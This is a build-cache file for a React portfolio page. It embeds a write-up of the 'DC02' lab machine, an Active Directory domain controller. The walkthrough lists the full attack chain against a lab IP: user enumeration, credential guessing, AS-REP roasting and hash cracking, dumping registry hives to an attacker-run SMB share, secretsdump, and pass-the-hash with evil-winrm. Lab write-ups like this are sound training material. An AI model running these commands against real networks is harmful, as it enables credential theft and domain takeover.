{"ast":null,"code":"import React from'react';import{Link}from'react-router-dom';import{motion}from'framer-motion';import{FaArrowLeft,FaCalendar,FaServer,FaStar,FaDesktop,FaNetworkWired}from'react-icons/fa';import TableOfContents from'../../../components/TableOfContents';import'./DC02Walkthrough.css';import{jsx as _jsx,jsxs as _jsxs}from\"react/jsx-runtime\";const DC02Walkthrough=()=>{// DC02 Writeup data\nconst writeup={id:'dc02-walkthrough',title:'DC02 Walkthrough',date:'Aug 12, 2025',tags:['hmv','windows','ad','asreproast','dcsync','backup-operators','password-cracking','smb','ldap'],difficulty:'Medium',os:'Windows',ip:'192.168.0.18',content:\"\\n# DC02 Walkthrough\\n\\n## Overview\\nThis Windows Domain Controller (DC01) in the SOUPEDECODE.LOCAL domain was discovered via internal network scanning. Enumeration revealed multiple Active Directory services and valid SMB credentials (charlie:charlie). AS-REP roasting against zximena448 yielded the password internet, granting Backup Operators group privileges. Registry hives (SAM, SYSTEM, SECURITY) were extracted remotely and cracked to obtain administrator-level hashes. Pass-the-Hash via WinRM provided full domain compromise and access to the root flag.\\n\\n## Enumeration\\n### Portscanning\\nRunning `Nmap` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows Server with `Active Directory` services.\\n```bash\\nsudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 192.168.0.18 -oN nmap/log.nmap\\n\\nPORT      STATE SERVICE       REASON          VERSION\\n53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus\\n88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-03-07 22:09:06Z)\\n135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\\n139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn\\n389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\\n445/tcp   open  microsoft-ds? syn-ack ttl 128\\n464/tcp   open  kpasswd5?     syn-ack ttl 128\\n593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\\n636/tcp   open  tcpwrapped    syn-ack ttl 128\\n3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\\n3269/tcp  open  tcpwrapped    syn-ack ttl 128\\n5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n|_http-server-header: Microsoft-HTTPAPI/2.0\\n|_http-title: Not Found\\n9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing\\n49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\\n49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\\n49682/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\\n49713/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\\nMAC Address: 08:00:27:81:BE:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\\n\\nHost script results:\\n| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:81:be:9a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\\n| Names:\\n|   DC01<00>             Flags: <unique><active>\\n|   SOUPEDECODE<00>      Flags: <group><active>\\n|   SOUPEDECODE<1c>      Flags: <group><active>\\n|   DC01<20>             Flags: <unique><active>\\n|   SOUPEDECODE<1b>      Flags: <unique><active>\\n| Statistics:\\n|   08:00:27:81:be:9a:00:00:00:00:00:00:00:00:00:00:00\\n|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\\n|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00\\n| p2p-conficker: \\n|   Checking for Conficker.C or higher...\\n|   Check 1 (port 48259/tcp): CLEAN (Timeout)\\n|   Check 2 (port 7597/tcp): CLEAN (Timeout)\\n|   Check 3 (port 45162/udp): CLEAN (Timeout)\\n|   Check 4 (port 59782/udp): CLEAN (Timeout)\\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\\n| smb2-time: \\n|   date: 2025-03-07T22:09:54\\n|_  start_date: N/A\\n| smb2-security-mode: \\n|   3:1:1: \\n|_    Message signing enabled and required\\n|_clock-skew: 3h59m56s\\n```\\n\\nAdding the domains into `hosts` file.\\n```bash\\necho \\\"192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL\\\" | sudo tee -a /etc/hosts\\n```\\n\\n### Service Enumeration\\nRunning kerbrute to enumerate users.\\n```bash\\n./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\\n```\\n\\n![Kerbrute User Enumeration](/images/writeups/dc02/1.png)\\n\\n## Foothold\\n### Exploitation\\nWe can try an username\\u2013password pairs line by line using nxc. We will see that `charlie:charlie` is a valid pair.\\n```bash\\nnxc smb 192.168.0.18 -u charlie -p charlie\\n```\\n![SMB Authentication](/images/writeups/dc02/2.png)\\n\\nWith `charlie` credentials, we can access and enumerate the SMB shares.\\n```bash\\nnxc smb 192.168.0.18 -u charlie -p charlie --shares\\n```\\n![SMB Shares Enumeration](/images/writeups/dc02/3.png)\\n\\nEnumerating users from LDAP with nxc.\\n```bash\\nnxc ldap SOUPEDECODE.LOCAL -u charlie -p charlie --users\\n```\\n![IPC Share Listing](/images/writeups/dc02/4.png)\\n\\nSaved the users result on a file. Now we can try to make an AS-REP roast attack using the impacket tool, that will allow us to extract the asrep hash of `zximena448`.\\n```bash\\nimpacket-GetNPUsers -dc-ip 192.168.0.18 -request -usersfile users.txt SOUPEDECODE.LOCAL/\\n```\\n![NETLOGON Share Listing](/images/writeups/dc02/5.png)\\n\\nCracking the `zximena448` hash with hashcat.\\n```bash\\nhashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt\\n```\\n![SYSVOL Share Listing](/images/writeups/dc02/6.png)\\n\\n### User Flag\\nThe `zximena448` user have READ and WRITE permissions on C$ share folder:\\n```bash\\nnxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares\\n```\\n![SYSVOL Domain Listing](/images/writeups/dc02/7.png)\\n\\nAuthenticating as `zximena448` user and retrieving the user flag.\\n```bash\\nsmbclient //192.168.0.18/C$ -U 'zximena448'\\n```\\n![SYSVOL Policies Listing](/images/writeups/dc02/8.png)\\n\\n## Post-Exploitation\\n### Privilege Escalation\\nDumping domain informations with ldapdomaindump.\\n```bash\\nsudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\\\zximena448' -p 'i...' 192.168.0.18\\n```\\n![SYSVOL Policy Listing](/images/writeups/dc02/9.png)\\n\\nThe `zximena448` user it's a member from Backup Operator group.\\n![SYSVOL Machine Listing](/images/writeups/dc02/10.png)\\n\\nWith that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the `impacket-reg` tool:\\n\\n- Creating a share folder to receive the files:\\n```bash\\nmkdir -p /tmp/share\\nchmod 777 /tmp/share\\nimpacket-smbserver share /tmp/share -smb2support\\n```\\n\\n- Running the `impacket-reg` command to copy the files:\\n```bash\\nimpacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\\\\\\\192.168.0.8\\\\share'\\n```\\n![SYSVOL Scripts Listing](/images/writeups/dc02/11.png)\\n\\nWith those files, we can use `impacket-secretsdump` to extract the hashes.\\n```bash\\nimpacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\\n\\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::\\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\\n```\\n![SYSVOL Startup Listing](/images/writeups/dc02/12.png)\\n\\nWe also can use the `dc01$` machine account and make a pass the hash attack to dump all hashes from domain controler.\\n```bash\\nimpacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...\\n```\\n![Backup Script Content](/images/writeups/dc02/13.png)\\n\\n### Root Flag\\nWe can authenticate as the Administrator making a pass the hash attack:\\n```bash\\nnxc winrm 192.168.0.18 -u Administrator -H 8982...\\n```\\n![Administrator Authentication](/images/writeups/dc02/14.png)\\n\\nAuthenticating as Administrator and retrieving the root flag.\\n```bash\\nevil-winrm -i 192.168.0.18 -u Administrator -H 8982...\\n```\\n![Root Flag Retrieval](/images/writeups/dc02/17.png)\\n    \"};return/*#__PURE__*/_jsxs(motion.div,{className:\"writeup-detail-page\",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:0.6},children:[/*#__PURE__*/_jsxs(\"div\",{className:\"writeup-header\",children:[/*#__PURE__*/_jsxs(Link,{to:\"/writeups\",className:\"back-button\",children:[/*#__PURE__*/_jsx(FaArrowLeft,{}),/*#__PURE__*/_jsx(\"span\",{children:\"Back to Writeups\"})]}),/*#__PURE__*/_jsxs(motion.div,{className:\"writeup-title-section\",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:0.2,duration:0.6},children:[/*#__PURE__*/_jsx(\"h1\",{children:writeup.title}),/*#__PURE__*/_jsx(\"div\",{className:\"writeup-meta\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"meta-item\",children:[/*#__PURE__*/_jsx(FaCalendar,{}),/*#__PURE__*/_jsx(\"span\",{children:writeup.date})]})}),/*#__PURE__*/_jsx(\"div\",{className:\"writeup-tags\",children:writeup.tags.map((tag,index)=>/*#__PURE__*/_jsx(motion.span,{className:\"tag-badge\",initial:{scale:0,opacity:0},animate:{scale:1,opacity:1},transition:{delay:0.3+index*0.1,duration:0.3},whileHover:{scale:1.1},style:{cursor:'pointer'},onClick:()=>window.location.href=\"/tags/\".concat(tag),children:tag},tag))}),/*#__PURE__*/_jsx(\"div\",{className:\"machine-info\",children:/*#__PURE__*/_jsxs(\"div\",{className:\"machine-info-content\",children:[/*#__PURE__*/_jsxs(\"div\",{className:\"machine-info-left\",children:[/*#__PURE__*/_jsxs(\"h6\",{children:[/*#__PURE__*/_jsx(FaServer,{}),\" Machine Information:\"]}),/*#__PURE__*/_jsxs(\"div\",{className:\"machine-info-vertical\",children:[/*#__PURE__*/_jsxs(\"div\",{className:\"info-item\",children:[/*#__PURE__*/_jsx(FaDesktop,{}),\" OS:\",/*#__PURE__*/_jsx(\"img\",{src:\"/os-icons/\".concat(writeup.os,\".png\"),alt:\"\".concat(writeup.os,\" Icon\"),className:\"os-icon\",onError:e=>{e.target.style.display='none';e.target.nextSibling.style.display='inline';}})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"info-item\",children:[/*#__PURE__*/_jsx(FaStar,{}),\" Difficulty: \",writeup.difficulty]}),/*#__PURE__*/_jsxs(\"div\",{className:\"info-item\",children:[/*#__PURE__*/_jsx(FaNetworkWired,{}),\" IP: \",writeup.ip]})]})]}),/*#__PURE__*/_jsx(\"div\",{className:\"machine-info-right\",children:/*#__PURE__*/_jsx(\"img\",{src:\"/images/writeups/dc02-machine.png\",alt:\"DC02 Machine\",className:\"machine-image\"})})]})})]})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"writeup-layout\",children:[/*#__PURE__*/_jsx(motion.div,{className:\"writeup-content\",initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{delay:0.4,duration:0.6},children:/*#__PURE__*/_jsx(\"div\",{className:\"markdown-content\",children:(()=>{const lines=writeup.content.split('\\n');const elements=[];let i=0;while(i<lines.length){const line=lines[i];if(line.startsWith('# ')){elements.push(/*#__PURE__*/_jsx(\"h1\",{children:line.substring(2)},i));}else if(line.startsWith('## ')){elements.push(/*#__PURE__*/_jsx(\"h2\",{children:line.substring(3)},i));}else if(line.startsWith('### ')){elements.push(/*#__PURE__*/_jsx(\"h3\",{children:line.substring(4)},i));}else if(line.startsWith('```')){// Handle code blocks\nconst language=line.substring(3).trim();const codeLines=[];i++;while(i<lines.length&&!lines[i].startsWith('```')){codeLines.push(lines[i]);i++;}elements.push(/*#__PURE__*/_jsx(\"pre\",{className:\"code-block\",children:/*#__PURE__*/_jsx(\"code\",{className:\"language-\".concat(language),children:codeLines.join('\\n')})},i));}else if(line.startsWith('![')&&line.includes('](')&&line.endsWith(')')){const altText=line.match(/\\[(.*?)\\]/)[1];const imageSrc=line.match(/\\((.*?)\\)/)[1];elements.push(/*#__PURE__*/_jsx(\"div\",{className:\"image-container\",children:/*#__PURE__*/_jsx(\"img\",{src:imageSrc,alt:altText,className:\"content-image\"})},i));}else if(line.trim()===''){elements.push(/*#__PURE__*/_jsx(\"br\",{},i));}else{// Process inline markdown\nconst processedLine=line.replace(/\\*\\*(.*?)\\*\\*/g,'<strong>$1</strong>')// Bold\n.replace(/\\*(.*?)\\*/g,'<em>$1</em>')// Italic\n.replace(/`(.*?)`/g,'<code class=\"inline-code\">$1</code>');// Inline code\nelements.push(/*#__PURE__*/_jsx(\"p\",{dangerouslySetInnerHTML:{__html:processedLine}},i));}i++;}return elements;})()})}),/*#__PURE__*/_jsx(TableOfContents,{content:writeup.content})]})]});};export default DC02Walkthrough;","map":{"version":3,"names":["React","Link","motion","FaArrowLeft","FaCalendar","FaServer","FaStar","FaDesktop","FaNetworkWired","TableOfContents","jsx","_jsx","jsxs","_jsxs","DC02Walkthrough","writeup","id","title","date","tags","difficulty","os","ip","content","div","className","initial","opacity","y","animate","transition","duration","children","to","delay","map","tag","index","span","scale","whileHover","style","cursor","onClick","window","location","href","concat","src","alt","onError","e","target","display","nextSibling","lines","split","elements","i","length","line","startsWith","push","substring","language","trim","codeLines","join","includes","endsWith","altText","match","imageSrc","processedLine","replace","dangerouslySetInnerHTML","__html"],"sources":["/home/v01/Myrepos/Port2/src/pages/writeups/dc02/DC02Walkthrough.js"],"sourcesContent":["import React from 'react';\nimport { Link } from 'react-router-dom';\nimport { motion } from 'framer-motion';\nimport { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired } from 'react-icons/fa';\nimport TableOfContents from '../../../components/TableOfContents';\nimport './DC02Walkthrough.css';\n\nconst DC02Walkthrough = () => {\n  // DC02 Writeup data\n  const writeup = {\n    id: 'dc02-walkthrough',\n    title: 'DC02 Walkthrough',\n    date: 'Aug 12, 2025',\n    tags: ['hmv', 'windows', 'ad', 'asreproast', 'dcsync', 'backup-operators', 'password-cracking', 'smb', 'ldap'],\n    difficulty: 'Medium',\n    os: 'Windows',\n    ip: '192.168.0.18',\n    content: `\n# DC02 Walkthrough\n\n## Overview\nThis Windows Domain Controller (DC01) in the SOUPEDECODE.LOCAL domain was discovered via internal network scanning. Enumeration revealed multiple Active Directory services and valid SMB credentials (charlie:charlie). AS-REP roasting against zximena448 yielded the password internet, granting Backup Operators group privileges. Registry hives (SAM, SYSTEM, SECURITY) were extracted remotely and cracked to obtain administrator-level hashes. Pass-the-Hash via WinRM provided full domain compromise and access to the root flag.\n\n## Enumeration\n### Portscanning\nRunning \\`Nmap\\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows Server with \\`Active Directory\\` services.\n\\`\\`\\`bash\nsudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 192.168.0.18 -oN nmap/log.nmap\n\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-03-07 22:09:06Z)\n135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 128\n464/tcp   open  kpasswd5?     syn-ack ttl 128\n593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 128\n3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 128\n5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing\n49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n49682/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\n49713/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\nMAC Address: 08:00:27:81:BE:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:81:be:9a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| Names:\n|   DC01<00>             Flags: <unique><active>\n|   SOUPEDECODE<00>      Flags: <group><active>\n|   SOUPEDECODE<1c>      Flags: <group><active>\n|   DC01<20>             Flags: <unique><active>\n|   SOUPEDECODE<1b>      Flags: <unique><active>\n| Statistics:\n|   08:00:27:81:be:9a:00:00:00:00:00:00:00:00:00:00:00\n|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 48259/tcp): CLEAN (Timeout)\n|   Check 2 (port 7597/tcp): CLEAN (Timeout)\n|   Check 3 (port 45162/udp): CLEAN (Timeout)\n|   Check 4 (port 59782/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time: \n|   date: 2025-03-07T22:09:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 3h59m56s\n\\`\\`\\`\n\nAdding the domains into \\`hosts\\` file.\n\\`\\`\\`bash\necho \"192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL\" | sudo tee -a /etc/hosts\n\\`\\`\\`\n\n### Service Enumeration\nRunning kerbrute to enumerate users.\n\\`\\`\\`bash\n./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\n\\`\\`\\`\n\n![Kerbrute User Enumeration](/images/writeups/dc02/1.png)\n\n## Foothold\n### Exploitation\nWe can try an usernameâ€“password pairs line by line using nxc. We will see that \\`charlie:charlie\\` is a valid pair.\n\\`\\`\\`bash\nnxc smb 192.168.0.18 -u charlie -p charlie\n\\`\\`\\`\n![SMB Authentication](/images/writeups/dc02/2.png)\n\nWith \\`charlie\\` credentials, we can access and enumerate the SMB shares.\n\\`\\`\\`bash\nnxc smb 192.168.0.18 -u charlie -p charlie --shares\n\\`\\`\\`\n![SMB Shares Enumeration](/images/writeups/dc02/3.png)\n\nEnumerating users from LDAP with nxc.\n\\`\\`\\`bash\nnxc ldap SOUPEDECODE.LOCAL -u charlie -p charlie --users\n\\`\\`\\`\n![IPC Share Listing](/images/writeups/dc02/4.png)\n\nSaved the users result on a file. Now we can try to make an AS-REP roast attack using the impacket tool, that will allow us to extract the asrep hash of \\`zximena448\\`.\n\\`\\`\\`bash\nimpacket-GetNPUsers -dc-ip 192.168.0.18 -request -usersfile users.txt SOUPEDECODE.LOCAL/\n\\`\\`\\`\n![NETLOGON Share Listing](/images/writeups/dc02/5.png)\n\nCracking the \\`zximena448\\` hash with hashcat.\n\\`\\`\\`bash\nhashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt\n\\`\\`\\`\n![SYSVOL Share Listing](/images/writeups/dc02/6.png)\n\n### User Flag\nThe \\`zximena448\\` user have READ and WRITE permissions on C$ share folder:\n\\`\\`\\`bash\nnxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares\n\\`\\`\\`\n![SYSVOL Domain Listing](/images/writeups/dc02/7.png)\n\nAuthenticating as \\`zximena448\\` user and retrieving the user flag.\n\\`\\`\\`bash\nsmbclient //192.168.0.18/C$ -U 'zximena448'\n\\`\\`\\`\n![SYSVOL Policies Listing](/images/writeups/dc02/8.png)\n\n## Post-Exploitation\n### Privilege Escalation\nDumping domain informations with ldapdomaindump.\n\\`\\`\\`bash\nsudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\\\zximena448' -p 'i...' 192.168.0.18\n\\`\\`\\`\n![SYSVOL Policy Listing](/images/writeups/dc02/9.png)\n\nThe \\`zximena448\\` user it's a member from Backup Operator group.\n![SYSVOL Machine Listing](/images/writeups/dc02/10.png)\n\nWith that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the \\`impacket-reg\\` tool:\n\n- Creating a share folder to receive the files:\n\\`\\`\\`bash\nmkdir -p /tmp/share\nchmod 777 /tmp/share\nimpacket-smbserver share /tmp/share -smb2support\n\\`\\`\\`\n\n- Running the \\`impacket-reg\\` command to copy the files:\n\\`\\`\\`bash\nimpacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\\\\\\\192.168.0.8\\\\share'\n\\`\\`\\`\n![SYSVOL Scripts Listing](/images/writeups/dc02/11.png)\n\nWith those files, we can use \\`impacket-secretsdump\\` to extract the hashes.\n\\`\\`\\`bash\nimpacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\\`\\`\\`\n![SYSVOL Startup Listing](/images/writeups/dc02/12.png)\n\nWe also can use the \\`dc01$\\` machine account and make a pass the hash attack to dump all hashes from domain controler.\n\\`\\`\\`bash\nimpacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...\n\\`\\`\\`\n![Backup Script Content](/images/writeups/dc02/13.png)\n\n### Root Flag\nWe can authenticate as the Administrator making a pass the hash attack:\n\\`\\`\\`bash\nnxc winrm 192.168.0.18 -u Administrator -H 8982...\n\\`\\`\\`\n![Administrator Authentication](/images/writeups/dc02/14.png)\n\nAuthenticating as Administrator and retrieving the root flag.\n\\`\\`\\`bash\nevil-winrm -i 192.168.0.18 -u Administrator -H 8982...\n\\`\\`\\`\n![Root Flag Retrieval](/images/writeups/dc02/17.png)\n    `\n  };\n\n  return (\n    <motion.div \n      className=\"writeup-detail-page\"\n      initial={{ opacity: 0, y: 20 }}\n      animate={{ opacity: 1, y: 0 }}\n      transition={{ duration: 0.6 }}\n    >\n      <div className=\"writeup-header\">\n        <Link to=\"/writeups\" className=\"back-button\">\n          <FaArrowLeft />\n          <span>Back to Writeups</span>\n        </Link>\n        \n        <motion.div \n          className=\"writeup-title-section\"\n          initial={{ opacity: 0, y: 20 }}\n          animate={{ opacity: 1, y: 0 }}\n          transition={{ delay: 0.2, duration: 0.6 }}\n        >\n          <h1>{writeup.title}</h1>\n          \n          <div className=\"writeup-meta\">\n            <div className=\"meta-item\">\n              <FaCalendar />\n              <span>{writeup.date}</span>\n            </div>\n          </div>\n\n          <div className=\"writeup-tags\">\n            {writeup.tags.map((tag, index) => (\n              <motion.span\n                key={tag}\n                className=\"tag-badge\"\n                initial={{ scale: 0, opacity: 0 }}\n                animate={{ scale: 1, opacity: 1 }}\n                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}\n                whileHover={{ scale: 1.1 }}\n                style={{ cursor: 'pointer' }}\n                onClick={() => window.location.href = `/tags/${tag}`}\n              >\n                {tag}\n              </motion.span>\n            ))}\n          </div>\n\n          <div className=\"machine-info\">\n            <div className=\"machine-info-content\">\n              <div className=\"machine-info-left\">\n                <h6><FaServer /> Machine Information:</h6>\n                <div className=\"machine-info-vertical\">\n                  <div className=\"info-item\">\n                    <FaDesktop /> OS: \n                    <img \n                      src={`/os-icons/${writeup.os}.png`} \n                      alt={`${writeup.os} Icon`} \n                      className=\"os-icon\"\n                      onError={(e) => {\n                        e.target.style.display = 'none';\n                        e.target.nextSibling.style.display = 'inline';\n                      }}\n                    />\n                  </div>\n                  <div className=\"info-item\">\n                    <FaStar /> Difficulty: {writeup.difficulty}\n                  </div>\n                  <div className=\"info-item\">\n                    <FaNetworkWired /> IP: {writeup.ip}\n                  </div>\n                </div>\n              </div>\n              <div className=\"machine-info-right\">\n                <img src=\"/images/writeups/dc02-machine.png\" alt=\"DC02 Machine\" className=\"machine-image\" />\n              </div>\n            </div>\n          </div>\n        </motion.div>\n      </div>\n\n      <div className=\"writeup-layout\">\n        <motion.div \n          className=\"writeup-content\"\n          initial={{ opacity: 0, y: 20 }}\n          animate={{ opacity: 1, y: 0 }}\n          transition={{ delay: 0.4, duration: 0.6 }}\n        >\n          <div className=\"markdown-content\">\n            {(() => {\n              const lines = writeup.content.split('\\n');\n              const elements = [];\n              let i = 0;\n              \n              while (i < lines.length) {\n                const line = lines[i];\n                \n                if (line.startsWith('# ')) {\n                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);\n                } else if (line.startsWith('## ')) {\n                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);\n                } else if (line.startsWith('### ')) {\n                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);\n                } else if (line.startsWith('```')) {\n                  // Handle code blocks\n                  const language = line.substring(3).trim();\n                  const codeLines = [];\n                  i++;\n                  \n                  while (i < lines.length && !lines[i].startsWith('```')) {\n                    codeLines.push(lines[i]);\n                    i++;\n                  }\n                  \n                  elements.push(\n                    <pre key={i} className=\"code-block\">\n                      <code className={`language-${language}`}>\n                        {codeLines.join('\\n')}\n                      </code>\n                    </pre>\n                  );\n                } else if (line.startsWith('![') && line.includes('](') && line.endsWith(')')) {\n                  const altText = line.match(/\\[(.*?)\\]/)[1];\n                  const imageSrc = line.match(/\\((.*?)\\)/)[1];\n                  elements.push(\n                    <div key={i} className=\"image-container\">\n                      <img src={imageSrc} alt={altText} className=\"content-image\" />\n                    </div>\n                  );\n                } else if (line.trim() === '') {\n                  elements.push(<br key={i} />);\n                } else {\n                  // Process inline markdown\n                  const processedLine = line\n                    .replace(/\\*\\*(.*?)\\*\\*/g, '<strong>$1</strong>') // Bold\n                    .replace(/\\*(.*?)\\*/g, '<em>$1</em>') // Italic\n                    .replace(/`(.*?)`/g, '<code class=\"inline-code\">$1</code>'); // Inline code\n                  \n                  elements.push(\n                    <p key={i} dangerouslySetInnerHTML={{ __html: processedLine }} />\n                  );\n                }\n                \n                i++;\n              }\n              \n              return elements;\n            })()}\n          </div>\n        </motion.div>\n        <TableOfContents content={writeup.content} />\n      </div>\n    </motion.div>\n  );\n};\n\nexport default DC02Walkthrough;\n"],"mappings":"AAAA,MAAO,CAAAA,KAAK,KAAM,OAAO,CACzB,OAASC,IAAI,KAAQ,kBAAkB,CACvC,OAASC,MAAM,KAAQ,eAAe,CACtC,OAASC,WAAW,CAAEC,UAAU,CAAEC,QAAQ,CAAEC,MAAM,CAAEC,SAAS,CAAEC,cAAc,KAAQ,gBAAgB,CACrG,MAAO,CAAAC,eAAe,KAAM,qCAAqC,CACjE,MAAO,uBAAuB,CAAC,OAAAC,GAAA,IAAAC,IAAA,CAAAC,IAAA,IAAAC,KAAA,yBAE/B,KAAM,CAAAC,eAAe,CAAGA,CAAA,GAAM,CAC5B;AACA,KAAM,CAAAC,OAAO,CAAG,CACdC,EAAE,CAAE,kBAAkB,CACtBC,KAAK,CAAE,kBAAkB,CACzBC,IAAI,CAAE,cAAc,CACpBC,IAAI,CAAE,CAAC,KAAK,CAAE,SAAS,CAAE,IAAI,CAAE,YAAY,CAAE,QAAQ,CAAE,kBAAkB,CAAE,mBAAmB,CAAE,KAAK,CAAE,MAAM,CAAC,CAC9GC,UAAU,CAAE,QAAQ,CACpBC,EAAE,CAAE,SAAS,CACbC,EAAE,CAAE,cAAc,CAClBC,OAAO,+6OAgLT,CAAC,CAED,mBACEV,KAAA,CAACX,MAAM,CAACsB,GAAG,EACTC,SAAS,CAAC,qBAAqB,CAC/BC,OAAO,CAAE,CAAEC,OAAO,CAAE,CAAC,CAAEC,CAAC,CAAE,EAAG,CAAE,CAC/BC,OAAO,CAAE,CAAEF,OAAO,CAAE,CAAC,CAAEC,CAAC,CAAE,CAAE,CAAE,CAC9BE,UAAU,CAAE,CAAEC,QAAQ,CAAE,GAAI,CAAE,CAAAC,QAAA,eAE9BnB,KAAA,QAAKY,SAAS,CAAC,gBAAgB,CAAAO,QAAA,eAC7BnB,KAAA,CAACZ,IAAI,EAACgC,EAAE,CAAC,WAAW,CAACR,SAAS,CAAC,aAAa,CAAAO,QAAA,eAC1CrB,IAAA,CAACR,WAAW,GAAE,CAAC,cACfQ,IAAA,SAAAqB,QAAA,CAAM,kBAAgB,CAAM,CAAC,EACzB,CAAC,cAEPnB,KAAA,CAACX,MAAM,CAACsB,GAAG,EACTC,SAAS,CAAC,uBAAuB